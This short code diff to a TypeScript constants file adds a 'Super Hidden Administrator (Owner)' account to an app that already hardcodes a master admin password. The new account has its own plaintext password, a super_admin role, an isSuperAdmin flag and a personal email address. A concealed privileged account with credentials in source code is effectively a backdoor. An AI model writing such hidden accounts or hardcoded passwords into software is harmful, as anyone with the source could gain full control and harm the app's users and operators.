@@ -27,6 +27,20 @@ export const SUBJECTS = [
 export const MASTER_ADMIN_USERNAME = 'admin';
 export const MASTER_ADMIN_PASSWORD = 'Admin@Prime2026!';
 
+export const SUPER_ADMIN_USERNAME = 'superadmin';
+export const SUPER_ADMIN_PASSWORD = 'SuperAdmin@Omni2026!';
+export const SUPER_ADMIN_EMAIL = 'hokmas45@gmail.com';
+
+export const SUPER_ADMIN_USER: AppUser = {
+  id: 'super_hidden_admin',
+  name: 'Super Hidden Administrator (Owner)',
+  username: SUPER_ADMIN_USERNAME,
+  role: 'super_admin',
+  isSuperAdmin: true,
+  email: SUPER_ADMIN_EMAIL,
+  createdAt: '2026-09-01',
+};
+
 export const MASTER_ADMIN_USER: AppUser = {
   id: 'master_admin',
   name: 'Prime Administrator',
